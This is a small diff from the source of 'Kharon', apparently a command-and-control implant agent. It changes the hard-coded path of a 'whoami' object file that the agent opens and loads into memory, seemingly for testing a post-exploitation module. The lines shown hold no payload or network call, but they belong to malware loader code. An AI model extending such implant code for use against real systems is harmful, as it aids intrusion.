@@ -267,7 +267,7 @@ auto DECLFN Kharon::Start(
 
     // Success = Tsp->Checkin();
 
-    HANDLE FileHandle = Krnl32.CreateFileA("D:\\malw\\Kharon\\Agent\\whoami.o", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+    HANDLE FileHandle = Krnl32.CreateFileA("D:\\malw\\Kharon\\Agent\\whoami.x64.o", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
     ULONG  FileSize   = Krnl32.GetFileSize( FileHandle, 0 );
     PBYTE  FileBuff   = (PBYTE)Hp->Alloc( FileSize );
 
